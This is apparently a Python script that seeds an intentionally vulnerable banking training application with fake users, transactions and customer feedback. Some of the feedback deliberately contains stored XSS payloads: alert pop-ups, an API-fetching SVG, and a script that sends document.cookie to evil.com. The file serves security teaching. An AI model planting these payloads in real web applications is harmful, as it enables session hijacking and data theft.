#!/usr/bin/env python3
"""
Database Population Tool for Banking Security Training Application
Populates the database with sample users and transactions for testing purposes
"""
import sys
import random
import time
import string
from datetime import datetime, timedelta
from decimal import Decimal
from faker import Faker
from app import create_app
from models import Transaction

# Initialize Faker for generating realistic sample data
fake = Faker()

# Global set to track used reference numbers during population
used_reference_numbers = set()

# Sample companies for transaction generation
SAMPLE_COMPANIES = [
    'Amazon.com', 'Walmart', 'Target', 'Starbucks', 'McDonald\'s', 'Shell Gas Station',
    'AT&T', 'Verizon', 'Comcast', 'Netflix', 'Spotify', 'Apple', 'Google Pay',
    'PayPal', 'Uber', 'Lyft', 'DoorDash', 'Grubhub', 'Best Buy', 'Home Depot',
    'Lowe\'s', 'CVS Pharmacy', 'Walgreens', 'Kroger', 'Safeway', 'Whole Foods',
    'Costco', 'Sam\'s Club', 'Macy\'s', 'Nordstrom', 'Gap', 'Nike', 'Adidas',
    'REI', 'Dick\'s Sporting Goods', 'PetSmart', 'Petco', 'GameStop', 'Barnes & Noble',
    'Subway', 'Chipotle', 'Panera Bread', 'Domino\'s Pizza', 'Pizza Hut', 'KFC',
    'Taco Bell', 'Burger King', 'Wendy\'s', 'Chick-fil-A', 'In-N-Out Burger',
    'Office Depot', 'Staples', 'FedEx', 'UPS Store', 'USPS', 'H&M', 'Forever 21',
    'Victoria\'s Secret', 'Bath & Body Works', 'Bed Bath & Beyond', 'Williams Sonoma'
]

TRANSACTION_CATEGORIES = [
    'Food & Dining', 'Gas & Fuel', 'Shopping', 'Entertainment', 'Bills & Utilities',
    'Healthcare', 'Travel', 'Groceries', 'Technology', 'Education', 'Fitness',
    'Clothing', 'Home & Garden', 'Automotive', 'Insurance', 'Banking'
]


# Sample feedback messages with different sentiment levels
FEEDBACK_TEMPLATES = {
    5: [  # Excellent (5 stars)
        "Outstanding service! The mobile app is intuitive and the customer support team went above and beyond to help me.",
        "I've been banking here for years and the service keeps getting better. <b>Highly recommend!</b>",
        "Exceptional experience from start to finish. The staff is knowledgeable and always friendly.",
        "Best banking experience I've ever had. The online portal makes everything so easy!",
        "Five stars! Quick responses, great rates, and excellent customer service.",
        "<i>Amazing</i> digital banking features and the support team is fantastic!"
    ],
    4: [  # Good (4 stars)
        "Great bank overall. The app could use some improvements but the service is solid.",
        "Very satisfied with most aspects. Customer service is excellent, just wish the fees were lower.",
        "Good experience overall. The ATM network is extensive and staff is helpful.",
        "Happy with the service. <b>Professional staff</b> and reasonable rates.",
        "Solid banking experience. A few minor issues but nothing major.",
        "Good service and reliable. Would recommend to others."
    ],
    3: [  # Average (3 stars)
        "Average experience. Nothing special but gets the job done.",
        "Decent service but room for improvement in response times.",
        "OK bank. Some good features but the interface could be better.",
        "Middle of the road experience. Service is adequate.",
        "It's fine. Not the best, not the worst. Average banking experience.",
        "Acceptable service level. Could be better but meets basic needs."
    ],
    2: [  # Poor (2 stars)
        "Disappointing service. Long wait times and unhelpful staff.",
        "Expected better. The mobile app frequently has issues and customer service is slow.",
        "Below average experience. Multiple problems with account access.",
        "Not impressed. Communication could be much better.",
        "Poor response times and several technical issues with online banking.",
        "Frustrating experience with multiple service failures."
    ],
    1: [  # Very Poor (1 star)
        "Terrible experience. Constant system outages and poor customer support.",
        "Worst banking experience ever. Would not recommend to anyone.",
        "Extremely disappointed. Multiple issues that were never resolved properly.",
        "Awful service. Switching to another bank as soon as possible.",
        "Completely unsatisfied. Nothing but problems since opening my account.",
        "Very poor service quality. Numerous unresolved issues."
    ]
}

# XSS Payloads for security training (INTENTIONAL VULNERABILITIES)
XSS_PAYLOADS = [
    "<script>alert('XSS Vulnerability Found!');</script>",
    "<img src=x onerror=alert('Image XSS')>",
    "<b onmouseover=alert('Mouse XSS')>Hover over this text</b>",
    "Great service! <script>console.log('XSS logged');</script>",
    "<iframe src='javascript:alert(\"Iframe XSS\")'></iframe>",
    "Love the bank! <svg onload=alert('SVG XSS')>",
    "<input type='text' onfocus=alert('Input XSS') autofocus>",
    "Excellent! <div style='width:expression(alert(\"CSS XSS\"))'>",
    "<marquee onstart=alert('Marquee XSS')>Scrolling text</marquee>",
    "Good bank <body onload=alert('Body XSS')>"
]


def check_existing_data():
    """
    Check if database already contains user data
    Returns True if data exists, False if empty
    """
    # Use the global db instance that was properly initialized
    user_count = db.session.query(User).count()
    transaction_count = db.session.query(Transaction).count()
    
    print(f"Current database status:")
    print(f"  Users: {user_count}")
    print(f"  Transactions: {transaction_count}")
    
    return user_count > 0 or transaction_count > 0


def generate_account_number():
    """Generate a realistic bank account number"""
    # Format: 12-digit account number
    return f"{random.randint(100000000000, 999999999999)}"


def generate_random_password(length=12):
    """Generate a random password with specified length"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


# Global set to track used reference numbers during population
used_reference_numbers = set()


def generate_reference_number():
    """Generate a unique transaction reference number"""
    global used_reference_numbers
    
    max_attempts = 100
    for attempt in range(max_attempts):
        # Add tiny delay to ensure timestamp uniqueness
        if attempt > 0:
            time.sleep(0.001)  # 1ms delay
            
        # Format: TXN + timestamp with microseconds + random digits
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")  # Include microseconds
        random_suffix = f"{random.randint(10000, 99999)}"  # 5-digit random number
        reference = f"TXN{timestamp}{random_suffix}"
        
        if reference not in used_reference_numbers:
            used_reference_numbers.add(reference)
            return reference
    
    # Fallback: use UUID if we can't generate unique reference after max attempts
    import uuid
    reference = f"TXN{uuid.uuid4().hex[:16].upper()}"
    used_reference_numbers.add(reference)
    return reference


def create_users(count=None):
    """
    Create sample user accounts with realistic data
    Returns list of created users
    """
    users_with_passwords = []
    used_emails = set()
    used_account_numbers = set()

    print("Creating admin account...")
    admin = User(
        email="admin@example.com",
        first_name="Admin",
        last_name="Adminson",
        account_number="1001",
        balance=0,
        role='admin',
        created_at=fake.date_time_between(start_date='-2y', end_date='-6m'),
        is_active=True,
    )
    password = generate_random_password(12)
    admin.set_password(password)
    users_with_passwords.append((admin, password))

    print(f"Creating {count} user accounts...")

    for i in range(count):
        # Generate unique email
        while True:
            email = fake.email()
            if email not in used_emails:
                used_emails.add(email)
                break
        
        # Generate unique account number
        while True:
            account_number = generate_account_number()
            if account_number not in used_account_numbers:
                used_account_numbers.add(account_number)
                break
        
        # Generate random 12-character password
        password = generate_random_password(12)

        # Create user with secure password
        user = User(
            email=email,
            first_name=fake.first_name(),
            last_name=fake.last_name(),
            account_number=account_number,
            role='customer',
            balance=Decimal(str(round(random.uniform(500.00, 25000.00), 2))),
            created_at=fake.date_time_between(start_date='-2y', end_date='-6m'),
            is_active=True
        )
        
        # Set a random but reasonable password (for training purposes)
        user.set_password(password)
        
        # Store both user and password
        users_with_passwords.append((user, password))

        if (i + 1) % 10 == 0:
            print(f"  Created {i + 1}/{count} users...")
    
    # Add users to database session
    users = [user for user, _ in users_with_passwords]
    db.session.add_all(users)
    db.session.commit()
    
    print(f"✓ Successfully created {len(users)} users")
    return users_with_passwords


def create_transactions_for_user(user, transaction_count=None):
    """
    Create transactions for a specific user over the last 6 months
    Returns list of created transactions
    """

    # Admin users do not get transactions
    if (user.role == 'admin'):
        return []

    if transaction_count is None:
        transaction_count = random.randint(70, 100)
    
    transactions = []
    current_balance = user.balance
    
    # Generate transactions going backwards in time
    end_date = datetime.now()
    start_date = end_date - timedelta(days=180)  # 6 months back
    
    # Generate transaction dates
    transaction_dates = []
    for _ in range(transaction_count):
        random_date = fake.date_time_between(start_date=start_date, end_date=end_date)
        transaction_dates.append(random_date)
    
    # Sort dates in chronological order
    transaction_dates.sort()
    
    # Create transactions
    for i, transaction_date in enumerate(transaction_dates):
        # Determine transaction type (70% debit, 30% credit)
        is_credit = random.random() < 0.30
        transaction_type = 'credit' if is_credit else 'debit'
        
        # Generate amount based on transaction type
        if is_credit:
            # Credits: salary, refunds, transfers in
            if random.random() < 0.1:  # 10% chance of salary-like deposit
                amount = Decimal(str(round(random.uniform(2000.00, 8000.00), 2)))
            else:
                amount = Decimal(str(round(random.uniform(10.00, 500.00), 2)))
        else:
            # Debits: purchases, bills, withdrawals
            amount = Decimal(str(round(random.uniform(5.00, 1200.00), 2)))
        
        # Update balance
        if is_credit:
            current_balance += amount
        else:
            current_balance -= amount
            # Ensure balance doesn't go too negative
            if current_balance < Decimal('-1000.00'):
                current_balance += amount  # Revert the transaction
                continue
        
        # Round the balance to 2 decimal places
        current_balance = Decimal(str(round(float(current_balance), 2)))
        
        # Select company and category
        company = random.choice(SAMPLE_COMPANIES)
        category = random.choice(TRANSACTION_CATEGORIES)
        
        # Generate description
        descriptions = [
            f"Purchase at {company}",
            f"Payment to {company}",
            f"Online order from {company}",
            f"Service fee - {company}",
            f"Subscription - {company}",
            f"Refund from {company}" if is_credit else f"Bill payment - {company}"
        ]
        description = random.choice(descriptions)
        
        # Generate unique reference number
        reference_number = generate_reference_number()
        
        # Create transaction
        transaction = Transaction(
            user_id=user.id,
            transaction_type=transaction_type,
            amount=amount,
            company=company,
            description=description,
            date=transaction_date,
            reference_number=reference_number,
            balance_after=current_balance,
            category=category
        )
        
        transactions.append(transaction)
    
    return transactions

def create_feedback_for_users(users):
    """
    Create feedback entries for users with realistic distribution and some XSS payloads for training
    Returns list of created feedback entries
    """
    print("\n3️⃣ Creating customer feedback...")
    
    all_feedback = []
    
    # Determine how many users will leave feedback (60-80% of users)
    feedback_percentage = random.uniform(0.6, 0.8)
    num_feedback_users = int(len(users) * feedback_percentage)
    
    # Randomly select users who will leave feedback
    feedback_users = random.sample(users, num_feedback_users)
    
    print(f"  Generating feedback from {num_feedback_users}/{len(users)} users...")
    
    for i, user in enumerate(feedback_users):
        # skip admin users
        if (user.role == 'admin'):
            continue

        # Each user might leave 1-3 feedback entries over time
        num_feedback = random.choices([1, 2, 3], weights=[70, 25, 5])[0]
        
        for feedback_num in range(num_feedback):
            feedback = create_single_feedback(user, feedback_num)
            if feedback:
                all_feedback.append(feedback)
        
        if (i + 1) % 10 == 0:
            print(f"    Generated feedback for {i + 1}/{num_feedback_users} users...")
    
    # Add all feedback to the session
    print(f"  Adding {len(all_feedback)} feedback entries to database...")
    db.session.add_all(all_feedback)
    db.session.commit()
    
    print(f"✓ Successfully created {len(all_feedback)} feedback entries")
    return all_feedback


def create_single_feedback(user, feedback_index=0):
    """
    Create a single feedback entry for a user
    """
    # Generate feedback date (spread over last 6 months, with recent bias)
    end_date = datetime.now()
    start_date = end_date - timedelta(days=180)
    
    # Weight recent dates more heavily
    if random.random() < 0.4:  # 40% chance of very recent feedback (last 30 days)
        feedback_date = fake.date_time_between(start_date=end_date - timedelta(days=30), end_date=end_date)
    else:  # 60% chance of older feedback
        feedback_date = fake.date_time_between(start_date=start_date, end_date=end_date)
    
    # Determine score with realistic distribution
    # Most banks have higher ratings, so weight toward positive scores
    score_weights = [5, 15, 20, 35, 25]  # Weights for scores 1, 2, 3, 4, 5
    score = random.choices([1, 2, 3, 4, 5], weights=score_weights)[0]
    
    # 10% chance of including XSS payload for security training
    include_xss = random.random() < 0.1
    
    if include_xss:
        message = generate_xss_feedback_message(score)
    else:
        message = generate_normal_feedback_message(score)
    
    # 20% chance of anonymous feedback
    is_anonymous = random.random() < 0.2
    
    try:
        feedback = Feedback(
            user_id=user.id,
            score=score,
            message=message,
            created_at=feedback_date,
            is_anonymous=is_anonymous
        )
        
        return feedback
        
    except Exception as e:
        print(f"Error creating feedback for user {user.id}: {e}")
        return None


def generate_normal_feedback_message(score):
    """
    Generate a normal feedback message based on the score
    """
    # Get base template for the score
    base_message = random.choice(FEEDBACK_TEMPLATES[score])
    
    # 30% chance to add personalized details
    if random.random() < 0.3:
        personal_details = [
            " The mobile app works perfectly on my phone.",
            " I especially like the transaction search feature.",
            " The customer service representative was very helpful.",
            " The ATM locations are convenient for me.",
            " Online banking saves me so much time.",
            " The account dashboard is easy to navigate.",
            " I appreciate the email notifications.",
            " The security features give me peace of mind.",
            " Transfer process is quick and simple.",
            " The interest rates are competitive."
        ]
        
        if score >= 4:
            positive_details = [
                " Keep up the excellent work!",
                " This is why I recommend you to friends.",
                " Much better than my previous bank.",
                " The improvements over the years are noticeable.",
                " Everything works exactly as expected."
            ]
            personal_details.extend(positive_details)
        elif score <= 2:
            negative_details = [
                " I hope these issues get resolved soon.",
                " This needs immediate attention.",
                " I'm considering switching banks.",
                " Very frustrating experience overall.",
                " Multiple attempts to resolve this failed."
            ]
            personal_details.extend(negative_details)
        
        base_message += random.choice(personal_details)
    
    # 15% chance to add service-specific feedback
    if random.random() < 0.15:
        services = [
            "loan application process",
            "credit card services", 
            "investment options",
            "business banking features",
            "international transfers",
            "mortgage services",
            "savings account benefits",
            "checking account features"
        ]
        
        service = random.choice(services)
        if score >= 4:
            base_message += f" The {service} exceeded my expectations."
        elif score <= 2:
            base_message += f" Had significant problems with the {service}."
        else:
            base_message += f" The {service} was adequate."
    
    # Ensure message doesn't exceed 500 characters
    if len(base_message) > 500:
        base_message = base_message[:497] + "..."
    
    return base_message


def generate_xss_feedback_message(score):
    """
    Generate feedback message with XSS payload for security training
    INTENTIONAL VULNERABILITY: These messages contain XSS payloads
    """
    # Start with a normal-looking message
    normal_part = random.choice(FEEDBACK_TEMPLATES[score])
    
    # Select an XSS payload
    xss_payload = random.choice(XSS_PAYLOADS)
    
    # Different ways to embed the XSS
    embedding_methods = [
        lambda normal, xss: f"{normal} {xss}",  # Append XSS
        lambda normal, xss: f"{xss} {normal}",  # Prepend XSS  
        lambda normal, xss: f"{normal[:len(normal)//2]} {xss} {normal[len(normal)//2:]}",  # Insert in middle
        lambda normal, xss: xss,  # Just XSS payload
        lambda normal, xss: f"{normal} <!-- {xss} -->",  # Hidden in comment
    ]
    
    # Choose embedding method
    embed_method = random.choice(embedding_methods)
    message = embed_method(normal_part, xss_payload)
    
    # Some additional XSS variations
    if random.random() < 0.3:
        additional_xss = [
            "<style>body{background:red;}</style>",
            "javascript:alert('XSS')",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<link rel=stylesheet href=javascript:alert('CSS')>",
            "<table background=javascript:alert('Table')>",
        ]
        message += " " + random.choice(additional_xss)
    
    # Ensure message doesn't exceed 500 characters
    if len(message) > 500:
        message = message[:497] + "..."
    
    return message


def create_realistic_feedback_distribution():
    """
    Create additional feedback to ensure realistic score distribution
    This helps demonstrate different XSS attack vectors
    """
    print("\n4️⃣ Adding diverse feedback examples...")
    
    # Get some random users for additional feedback
    users = db.session.query(User).limit(10).all()
    if not users:
        return []
    
    special_feedback = []
    
    # Add some specific XSS examples for training purposes
    xss_examples = [
        {
            'score': 5,
            'message': "Excellent service! <img src='x' onerror='alert(\"Stored XSS in feedback!\")' />",
            'is_anonymous': False
        },
        {
            'score': 4, 
            'message': "Great bank! <script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            'is_anonymous': True
        },
        {
            'score': 3,
            'message': "Average service. <svg onload='fetch(\"/api/stats\").then(r=>r.json()).then(d=>alert(JSON.stringify(d)))'>",
            'is_anonymous': False
        },
        {
            'score': 2,
            'message': "Poor experience <iframe src='javascript:alert(\"Iframe XSS via feedback\")'></iframe>",
            'is_anonymous': True
        },
        {
            'score': 1,
            'message': "<div onmouseover='alert(\"Event handler XSS\")'>Terrible service - hover to see issue</div>",
            'is_anonymous': False
        }
    ]
    
    for i, example in enumerate(xss_examples):
        if i < len(users):
            user = users[i]
            feedback_date = fake.date_time_between(start_date='-30d', end_date='now')
            
            feedback = Feedback(
                user_id=user.id,
                score=example['score'],
                message=example['message'],
                created_at=feedback_date,
                is_anonymous=example['is_anonymous']
            )
            
            special_feedback.append(feedback)
    
    # Add some feedback with HTML formatting (legitimate use that could be exploited)
    html_examples = [
        {
            'score': 5,
            'message': "Love the new features! <b>Outstanding</b> customer service and <i>excellent</i> mobile app.",
            'is_anonymous': False
        },
        {
            'score': 4,
            'message': "Very happy with <u>all aspects</u> of the service. <b>Highly recommended!</b>",
            'is_anonymous': False
        },
        {
            'score': 3,
            'message': "Good service overall. The <i>online banking</i> could be <b>improved</b> though.",
            'is_anonymous': True
        }
    ]
    
    for i, example in enumerate(html_examples):
        if i + len(xss_examples) < len(users):
            user = users[i + len(xss_examples)]
            feedback_date = fake.date_time_between(start_date='-60d', end_date='-30d')
            
            feedback = Feedback(
                user_id=user.id,
                score=example['score'],
                message=example['message'],
                created_at=feedback_date,
                is_anonymous=example['is_anonymous']
            )
            
            special_feedback.append(feedback)
    
    if special_feedback:
        db.session.add_all(special_feedback)
        db.session.commit()
        print(f"✓ Added {len(special_feedback)} special feedback examples for security training")
    
    return special_feedback


# Update the main populate_database function to include feedback creation
def populate_database():
    """
    Main function to populate the database with sample data including feedback
    """
    print("=" * 60)
    print("Banking Security Training - Database Population Tool")
    print("=" * 60)
    
    # Check if data already exists
    if check_existing_data():
        print("\n⚠️  Database already contains data!")
        response = input("Do you want to continue and add more data? (y/N): ").lower()
        if response != 'y':
            print("❌ Population cancelled.")
            return None
        print("\n📝 Adding additional data to existing database...")
    else:
        print("\n📝 Database is empty. Populating with sample data...")
    
    try:
        # Clear the global reference number tracker
        global used_reference_numbers
        used_reference_numbers.clear()
        
        # Create users
        user_count = random.randint(30, 50)
        print("\n1️⃣ Creating user accounts...")
        users_with_passwords = create_users(user_count)
        
        # Commit users first to get their IDs
        db.session.commit()
        print(f"✅ Users committed to database")
        
        # Create transactions for each user
        print("\n2️⃣ Creating transactions...")
        total_transactions = 0
        all_transactions = []

        users = [user for user, _ in users_with_passwords]

        for i, user in enumerate(users):
            transaction_count = random.randint(70, 100)
            transactions = create_transactions_for_user(user, transaction_count)
            
            # Add transactions to our list
            all_transactions.extend(transactions)
            total_transactions += len(transactions)
            
            if (i + 1) % 10 == 0:
                print(f"  Generated transactions for {i + 1}/{len(users)} users...")
        
        print(f"  Generated {total_transactions} total transactions")
        print("  Adding transactions to database...")
        
        # Add all transactions to the session in batches
        batch_size = 500
        for i in range(0, len(all_transactions), batch_size):
            batch = all_transactions[i:i + batch_size]
            db.session.add_all(batch)
            
            # Commit each batch
            db.session.commit()
            print(f"    Committed batch {i//batch_size + 1}/{(len(all_transactions) + batch_size - 1)//batch_size}")
        
        # Create feedback for users
        feedback_entries = create_feedback_for_users(users)
        
        # Add special XSS examples for training
        special_feedback = create_realistic_feedback_distribution()
        
        # Create historical data
        create_and_populate_historical_data()
        
        print(f"\n✅ Database population completed successfully!")
        print(f"📊 Summary:")
        print(f"   Users created: {len(users)}")
        print(f"   Transactions created: {total_transactions}")
        print(f"   Feedback entries created: {len(feedback_entries) + len(special_feedback)}")
        print(f"   Average transactions per user: {total_transactions // len(users)}")
        print(f"   Average feedback per user: {(len(feedback_entries) + len(special_feedback)) / len(users):.1f}")
        
        # Show feedback distribution
        print(f"\n📈 Feedback Score Distribution:")
        for score in range(5, 0, -1):
            count = db.session.query(Feedback).filter_by(score=score).count()
            print(f"   {score} stars: {count} reviews")
        
        # Return a random user for login testing, but never return the admin
        test_user, test_password = random.choice([up for up in users_with_passwords if up[0].role != 'admin'])
        return {
            'email': test_user.email,
            'password': test_password,
            'name': test_user.get_full_name(),
            'account_number': test_user.account_number
        }
        
    except Exception as e:
        print(f"\n❌ Error during database population: {str(e)}")
        print(f"Error type: {type(e).__name__}")
        db.session.rollback()
        return None
    
def create_and_populate_historical_data():
    """
    Create and populate historical transaction tables
    """
    print("\n" + "=" * 60)
    print("🏛️  CREATING HISTORICAL DATA (2020-2021)")
    print("=" * 60)
    
    try:
        # Import the historical functions
        from create_historical_tables import create_all_historical_tables
        from populate_historical_data import populate_all_historical_tables, create_archived_transactions_function
        
        # Create historical tables
        print("Step 1: Creating historical tables...")
        created_tables = create_all_historical_tables(db, Transaction)
        
        if created_tables:
            print("Step 2: Populating historical tables...")
            populate_all_historical_tables(db, User)
            print("✅ Historical data creation complete!")
            # Create archived transactions function
            create_archived_transactions_function(db)
            print("✅ Archived transactions function created!")
        else:
            print("❌ Failed to create historical tables")
            
    except ImportError as e:
        print(f"⚠️  Historical table modules not found: {e}")
        print("   Historical data creation skipped")
    except Exception as e:
        print(f"❌ Error creating historical data: {e}")
    

def display_login_info(user_info):
    """
    Display login information for testing
    """
    if not user_info:
        return
    
    print("\n" + "=" * 60)
    print("🔑 TEST LOGIN CREDENTIALS")
    print("=" * 60)
    print(f"Email:    {user_info['email']}")
    print(f"Password: {user_info['password']}")
    print(f"Name:     {user_info['name']}")
    print(f"Account:  {user_info['account_number']}")
    print("=" * 60)
    print("🚀 You can now start the application and login with these credentials!")
    print("   Run: python python/app.py")
    print("=" * 60)


def main():
    """
    Main entry point for the population script
    """
    # Create Flask app context
    app = create_app()
    
    with app.app_context():
        # Import the models module to get the class definitions
        import models
        
        # Get the SQLAlchemy instance that was initialized with the app
        from flask import current_app
        db = current_app.extensions['sqlalchemy']
        
        # Get the model classes
        User = models.User
        Transaction = models.Transaction  
        Feedback = models.Feedback
        
        # Make models and db available globally for other functions
        globals()['db'] = db
        globals()['User'] = User
        globals()['Transaction'] = Transaction
        globals()['Feedback'] = Feedback
        
        # Create database tables if they don't exist
        try:
            print("🗑️ Dropping all existing tables...")
            db.drop_all()
            print("✅ All tables dropped")
            
            print("🏗️ Creating fresh database tables...")
            db.create_all()
            print("✅ Database tables created")
        except Exception as e:
            print(f"❌ Error recreating database tables: {e}")
            return

        # Populate database
        user_info = populate_database()
        
        # Display login credentials
        display_login_info(user_info)


if __name__ == '__main__':
    main()